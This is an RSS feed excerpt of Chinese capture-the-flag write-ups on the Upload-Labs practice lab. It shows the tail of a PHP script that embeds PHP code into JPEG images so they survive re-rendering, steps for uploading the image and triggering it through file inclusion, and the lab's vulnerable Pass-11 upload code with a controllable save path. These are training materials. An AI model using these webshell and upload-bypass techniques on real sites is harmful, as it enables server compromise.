&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;unlink&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;payload_&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$argv[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Something\&amp;#39;s wrong&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;checkImage&lt;/span&gt;($filename, $data, $unlink &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;FALSE&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;global&lt;/span&gt; $correctImage;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;file_put_contents&lt;/span&gt;($filename, $data);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $correctImage &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;TRUE&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;imagecreatefromjpeg&lt;/span&gt;($filename);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($unlink)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;unlink&lt;/span&gt;($filename);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; $correctImage;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;custom_error_handler&lt;/span&gt;($errno, $errstr, $errfile, $errline) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;global&lt;/span&gt; $extraBytes, $correctImage;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $correctImage &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;FALSE&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/(\d+) extraneous bytes before marker/&amp;#39;&lt;/span&gt;, $errstr, $m)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($m[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $extraBytes &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;int&lt;/span&gt;)$m[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;DataInputStream&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; $binData;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; $order;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; $size;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__construct&lt;/span&gt;($filename, $order &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;, $fromString &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;order&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $order;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;$fromString) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;file_exists&lt;/span&gt;($filename) &lt;span style="color:#f92672"&gt;||&lt;/span&gt; &lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;is_file&lt;/span&gt;($filename))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;File not exists [&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$filename&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;]&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;file_get_contents&lt;/span&gt;($filename);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $filename;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;size&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strlen&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;seek&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; ($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;size&lt;/span&gt; &lt;span style="color:#f92672"&gt;-&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strlen&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;skip&lt;/span&gt;($skip) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;, $skip);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;readByte&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;eof&lt;/span&gt;()) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;End Of File&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $byte &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ord&lt;/span&gt;($byte);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;readShort&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;strlen&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;) &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;End Of File&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $short &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;order&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $short &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;ord&lt;/span&gt;($short[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]) &lt;span style="color:#f92672"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;8&lt;/span&gt;) &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ord&lt;/span&gt;($short[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $short &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;ord&lt;/span&gt;($short[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;]) &lt;span style="color:#f92672"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;8&lt;/span&gt;) &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ord&lt;/span&gt;($short[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; $short;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;eof&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;!&lt;/span&gt;$this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;&lt;span style="color:#f92672"&gt;||&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;strlen&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;) &lt;span style="color:#f92672"&gt;===&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id="准备-1"&gt;准备
&lt;/h4&gt;&lt;p&gt;​ 准备一个&lt;strong&gt;yoo.jpg&lt;/strong&gt;图片，上传经过渲染以后再下载下到本地，保存为&lt;strong&gt;1.jpg&lt;/strong&gt;。&lt;/p&gt;
&lt;h4 id="插入代码"&gt;插入代码
&lt;/h4&gt;&lt;p&gt;​ 使用脚本处理&lt;strong&gt;1.jpg&lt;/strong&gt;插入php代码，执行命令&lt;code&gt;php jpg_payload.php 1.jpg&lt;/code&gt;。php命令执行方法上面有。执行成功以后应该如图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116212640.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 执行的目录下会多出一个名为&lt;code&gt;payload_1.jpg&lt;/code&gt;的文件，这就是制作好的图片马。大佬的源码我是修改了一下的，可以修改上面的第25行代码，自定义插入想要的代码。&lt;/p&gt;
&lt;h4 id="上传并验证"&gt;上传并验证
&lt;/h4&gt;&lt;p&gt;​ 上传以后同样先确定图片的名称和地址，适用文件包含进行验证&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116215008.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 如果如图所示，我们的图片马就上传成功了。&lt;strong&gt;需要提醒：有些图片不行可能需要多换几个图片试一试！！！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;呼，终于可以休息了。&lt;/p&gt;</description></item><item><title>Upload-Labs(三)</title><link>https://www.braindance.top/posts/ctf/upload-labs3/</link><pubDate>Mon, 16 Nov 2020 16:04:30 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/upload-labs3/</guid><description>&lt;h2 id="前言"&gt;前言
&lt;/h2&gt;&lt;p&gt;​ 继续接着上一次的&lt;code&gt;Upload-labs&lt;/code&gt;往下写。这记下第11-15题，目前进度是20题都已经完成正在抽时间写博客，然后16题是我卡的最久的关，不过也学到了感觉很牛的姿势，所以到时候专门开一篇只讲16。&lt;/p&gt;
&lt;p&gt;​ 在线靶机地址：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class="link" href="https://buuoj.cn/challenges#Upload-Labs-Linux" target="_blank" rel="noopener"
&gt;linux环境&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="link" href="https://buuoj.cn/challenges#[Windows]Upload-Labs-Windows" target="_blank" rel="noopener"
&gt;windows环境&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="pass-11"&gt;Pass-11
&lt;/h2&gt;&lt;p&gt;​ (这题使用了windows环境)&lt;/p&gt;
&lt;p&gt;​ 源码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $ext_arr &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;jpg&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;png&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;gif&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;],&lt;span style="color:#a6e22e"&gt;strrpos&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;],&lt;span style="color:#e6db74"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($file_ext,$ext_arr)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $temp_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;save_path&amp;#39;&lt;/span&gt;]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;rand&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;99&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;date&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;YmdHis&amp;#34;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$file_ext;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($temp_file,$img_path)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;上传出错！&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;只允许上传.jpg|.png|.gif类型文件！&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;​ 分析代码发现是一个白名单验证，但是和之前不同点在于路径中使用了&lt;code&gt;$_GET['save_path']&lt;/code&gt;，本题提示也写道&lt;/p&gt;
&lt;p&gt;&lt;code&gt;本pass上传路径可控！&lt;/code&gt;，就是通过这个GET变量控制上传路径。&lt;/p&gt;
&lt;p&gt;​ 这一关的突破方法需要有一些条件：php版本需要低于&lt;code&gt;5.3.29&lt;/code&gt;（我使用的是php版本5.3.17的本地靶机），另一个条件是&lt;code&gt;magic_quotes_gpc&lt;/code&gt;需要为关闭状态。&lt;code&gt;magic_quotes_gpc&lt;/code&gt;的作用官方文档写道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Warning&lt;/strong&gt; 本特性已自 PHP 5.3.0 起&lt;em&gt;废弃&lt;/em&gt;并将自 PHP 5.4.0 起&lt;em&gt;移除&lt;/em&gt;。&lt;/p&gt;
&lt;p&gt;​ 为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。 当 magic_quotes 为 on，所有的 &amp;rsquo; (单引号)、&amp;quot; (双引号)、\（反斜杠）和 NUL&amp;rsquo;s 被一个反斜杠自动转义。&lt;/p&gt;&lt;/blockquote&gt;
